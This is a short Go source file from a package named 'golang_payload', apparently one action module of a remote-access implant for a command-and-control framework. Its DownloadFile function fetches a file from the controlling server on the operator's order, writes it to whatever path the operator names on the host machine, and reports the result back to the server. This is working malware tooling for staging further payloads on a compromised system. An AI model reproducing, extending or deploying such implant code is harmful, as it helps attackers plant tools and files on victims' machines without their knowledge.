package actions

import (
	"golang_payload/types"
	"golang_payload/utils"
	"golang_payload/comms"
	"io"
	"net/http"
	"os"
)

// Download the file from the server and store it at the given path
func DownloadFile(task types.Task) {
	resp, err := comms.GetRequest("download/" + task.Name)

	if err != nil || resp.StatusCode != http.StatusOK {
		utils.Finish(task, "Could not download file.", false)
		return
	}

	defer resp.Body.Close()

	// Create the file locally
	file, err := os.Create(task.Args["target_path"].(string))

	if err != nil {
		utils.Finish(task, "Could not create file.", false)
		return
	}

	defer file.Close()

	// Write the file
	_, err = io.Copy(file, resp.Body)

	if err != nil {
		utils.Finish(task, "Could not write file.", false)
		return
	}

	utils.Finish(task, "File downloaded.", true)
}
